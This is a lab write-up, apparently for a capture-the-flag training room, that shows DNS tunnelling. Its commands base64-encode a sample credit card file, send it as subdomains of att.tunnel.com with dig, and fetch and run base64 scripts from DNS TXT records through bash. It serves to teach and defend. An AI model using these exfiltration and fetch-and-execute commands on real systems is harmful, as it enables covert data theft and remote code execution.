# Exfiltration over DNS

Since `DNS` is not a transport protocol, many organisations do not regularly monitor the DNS protocol. 
The `DNS` protocol is allowed in almost all firewalls in any organisational network, although good organisations 
will have monitoring in place to detect it afterwards. The fabulous `dnscat2` is very easy to get up and running.

Some IDS/IDPs are now capable of spotting DNS tunnelling, but often miss data sent via DNS TXT records. Re-useful tools
are [Uninvited-Guest](https://github.com/pentestpartners/Uninvited-Guest), and its earlier, more raw version 
[DNSTXT-encoder](https://github.com/pentestpartners/DNSTXT-encoder).

There are many use case scenarios, but the typical one is when the firewall blocks and filters all traffic. We can 
pass data or `TCP/UDP` packets through a firewall using the `DNS` protocol, but it is important to ensure that the 
`DNS` is allowed and resolving domain names to IP addresses.

* An attacker registers a domain name, for example, tunnel.com.
* The attacker sets up tunnel.com's NS record points to a server that the attacker controls.
* The malware or the attacker sends sensitive data from a victim machine to a domain name they control—for example, passw0rd.tunnel.com, where passw0rd is the data that needs to be transferred.
* The `DNS` request is sent through the local `DNS` server and is forwarded through the Internet.
* The attacker's authoritative `DNS` (malicious server) receives the `DNS` request.
* Finally, the attacker extracts the password from the domain name.

## DNS Data Exfiltration

* Get the required data that needs to be transferred.
* Encode the file using one of the encoding techniques.
* Send the encoded characters as subdomain/labels.
* Consider the limitations of the `DNS` protocol. Note that we can add as much data as we can to the domain name, but 
we must keep the whole URL under 255 characters, and each subdomain label ca not exceed 63 characters. If we do 
exceed these limits, we have to split the data and send more `DNS` requests.

Connect to the new thm attacker machine using ssh from the jump host:

    thm@jump-box$ ssh thm@attacker.thm.com

Capture DNS requests:
	
    thm@attacker$ sudo tcpdump -i eth0 udp port 53 -v 
    tcpdump: listening on eth0, link-type RAW (Raw IP), snapshot length 262144 bytes

Open a new terminal, ssh jump to victim2 from the jump host:

    thm@jump-box$ ssh thm@victim2.thm.com

Check the content of the `creds.txt` file:

    thm@victim2$ cat task9/credit.txt
    Name: THM-user
    Address: 1234 Internet, THM
    Credit Card: 1234-1234-1234-1234
    Expire: 05/05/2022
    Code: 1337

Encode:

    thm@victim2$ cat task9/credit.txt | base64
    TmFtZTogVEhNLXVzZXIKQWRkcmVzczogMTIzNCBJbnRlcm5ldCwgVEhNCkNyZWRpdCBDYXJkOiAx
    MjM0LTEyMzQtMTIzNC0xMjM0CkV4cGlyZTogMDUvMDUvMjAyMgpDb2RlOiAxMzM3Cg==

Split the content into multiple DNS requests:

    thm@victim2:~$ cat task9/credit.txt | base64 | tr -d "\n"| fold -w18 | sed -r 's/.*/&.att.tunnel.com/'
    TmFtZTogVEhNLXVzZX.att.tunnel.com
    IKQWRkcmVzczogMTIz.att.tunnel.com
    NCBJbnRlcm5ldCwgVE.att.tunnel.com
    hNCkNyZWRpdCBDYXJk.att.tunnel.com
    OiAxMjM0LTEyMzQtMT.att.tunnel.com
    IzNC0xMjM0CkV4cGly.att.tunnel.com
    ZTogMDUvMDUvMjAyMg.att.tunnel.com
    pDb2RlOiAxMzM3Cg==.att.tunnel.com

* `tr -d "\n"` - remove newlines.
* `fold -w18` - every 18 characters in a group
* `sed -r 's/.*/&.att.tunnel.com/'` - append the name server `att.tunnel.com` to every group

Now split every 18 characters with a dot `.` and add the name server:

    thm@victim2:~$ cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/
    TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.comthm@victim2:~$ 

From the victim2 machine, send the base64 data as a subdomain name via `dig` taking DNS limitations into account:

    thm@victim2:~$ cat task9/credit.txt |base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -d "\n" | sed s/$/att.tunnel.com/ | awk '{print "dig +short " $1}' | bash

Open a new terminal, jump to the attacker machine and check results using `tcpdump`:

    thm@attacker:~$ sudo tcpdump -i eth0 udp port 53 -v
    [sudo] password for thm: 
    tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
    16:06:05.923936 IP (tos 0x0, ttl 64, id 47515, offset 0, flags [none], proto UDP (17), length 104)
        172.20.0.1.43174 > attacker.domain: 19394% [1au] A? _.pDb2RlOiAxMzM3Cg==.att.tunnel.com. (76)
    16:06:05.924355 IP (tos 0x0, ttl 64, id 47516, offset 0, flags [none], proto UDP (17), length 235)
        172.20.0.1.36730 > attacker.domain: 33745% [1au] A? TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com. (207)
    16:06:05.926140 IP (tos 0x0, ttl 64, id 28057, offset 0, flags [DF], proto UDP (17), length 69)
        attacker.57010 > 172.20.0.1.domain: 53575+ PTR? 1.0.20.172.in-addr.arpa. (41)
    16:06:05.926243 IP (tos 0x0, ttl 64, id 47517, offset 0, flags [DF], proto UDP (17), length 123)
        172.20.0.1.domain > attacker.57010: 53575 NXDomain* 0/1/0 (95)

Clean and restore the received data:

    thm@attacker:~$ echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com." | cut -d"." -f1-8 | tr -d "." | base64 -d
    Name: THM-user
    Address: 1234 Internet, THM
    Credit Card: 1234-1234-1234-1234
    Expire: 05/05/2022
    Code: 1337

## C2 communications over DNS

In victim2, create a `script.sh` in `/tmp`:

    thm@victim2:~$ cd /tmp/
    thm@victim2:/tmp$ nano script.sh

The code for `script.sh`:

    #!/bin/bash 
    ping -c 1 test.thm.com

Encode the script:

    thm@victim2:~$ cat /tmp/script.sh | base64
    IyEvYmluL2Jhc2ggCnBpbmcgLWMgMSB0ZXN0LnRobS5jb20K

Add it as a `TXT` `DNS` record to the `tunnel.com` domain using the web interface provided: http://MACHINE_IP/

Confirm it was added successfully:

    thm@victim2:~$ dig +short -t TXT script.tunnel.com
    "IyEvYmluL2Jhc2gKcGluZyAtYyAxIHRlc3QudGhtLmNvbQo="

Run the script (clean using `tr` and deleting any double quotes `"`):

    thm@victim2:~$ dig +short -t TXT script.tunnel.com | tr -d "\"" | base64 -d | bash
    PING test.thm.com (127.0.0.1) 56(84) bytes of data.
    64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.019 ms
    
    --- test.thm.com ping statistics ---
    1 packets transmitted, 1 received, 0% packet loss, time 0ms
    rtt min/avg/max/mdev = 0.019/0.019/0.019/0.000 ms

Get the flag:

    thm@victim2:~$ dig +short -t TXT flag.tunnel.com | tr -d "\"" | base64 -d | bash
